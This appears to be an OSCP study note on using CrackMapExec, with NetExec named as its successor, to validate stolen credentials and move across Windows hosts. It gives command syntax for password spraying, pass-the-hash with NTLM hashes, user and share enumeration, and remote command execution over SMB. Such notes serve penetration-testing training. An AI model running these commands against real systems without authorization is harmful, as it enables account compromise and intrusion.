# CrackMapExec — Credential Validation & Lateral Movement (OSCP)

> **Note:** CrackMapExec (`crackmapexec`) is no longer actively maintained.
> On updated Kali installs, use **NetExec (`nxc`)** instead — same syntax, actively developed.
> See [[NetExec]] for the current version of this workflow.

CrackMapExec is used **after credentials or hashes are found** to:

- Validate access
- Expand access across hosts
- Identify admin privileges
- Perform credential reuse or pass-the-hash

## **Scenarios of Use**

- A username + password
- A username + NTLM hash
- Creds from:
    
    - SMB config files
        
    - winPEAS
        
    - Mimikatz
        
    - Cracked hashes


## **Core Syntax**
```bash
crackmapexec <protocol> <target> [options]
```
Protocols to use:
- smb
- winrm
- rdp

## **Validate Credentials (Always First)**

```bash
crackmapexec smb <IP> -u username -p password
```

**Purpose**

- Confirms creds are valid
- Shows domain, OS, SMB signing
- Indicates admin access


**Which Output Matters**
- + → valid creds
- Pwn3d! → local admin


## **Password Spraying**
```bash
crackmapexec smb <IP> -u users.txt -p 'Password1'
```
Optional:
```bash
--continue-on-success
```

**Purpose**
- Test password reuse
- Avoid lockouts




## **Pass-the-Hash**
```bash
crackmapexec smb <IP> -u user -H <NTLM_HASH>
```
**Purpose**
- No cracking needed



## **Enumerate Users**
```bash
crackmapexec smb <IP> -u user -p pass --users
```

**Purpose**
- Build better spray lists
- Identify high-value accounts


## **Enumerate Shares**
```bash
crackmapexec smb <IP> -u user -p pass --shares
```


## **Validate a Specific User**
```bash
crackmapexec smb IP -u user -p pass -x "whoami"
```

## **Spraying with Crackmapexec**
In the scenario where you have obtained credentials (and have already added them to separate txt files) such as usernames and passwords (or password hashes), we can spray them to see which password lines up with a specific user or multiple users if they are reused. 

Here is the example for using password hashes instead of a list of passwords
```bash
crackmapexec <protocol> <ip> -u <users.txt> -H <hashes.txt>
```

## **🔗 Related Notes**

- [[NetExec]]
- [[Password_Spraying]]
- [[SMB]]
- [[winPEAS]]
- [[Mimikatz]]